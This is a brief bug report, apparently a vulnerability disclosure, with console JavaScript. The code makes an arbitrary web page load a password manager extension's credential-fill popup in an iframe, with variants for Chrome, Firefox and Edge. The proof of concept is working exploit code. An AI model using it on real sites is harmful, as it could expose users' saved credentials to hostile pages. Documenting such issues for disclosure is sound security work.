To reproduce the issue:

1. Go to a site you have credentials saved for and click the little \"...\" icon.
2. Go to https://example.com
3. Enter this in the console:

y = document.createElement(\"iframe\");
y.height = 1024;
y.width = \"100%\";
y.src=\"chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/popupfilltab.html\";
// or y.src=\"moz-extension://...\";
// or y.src=\"ms-browser-extension://...\";
document.body.appendChild(y);
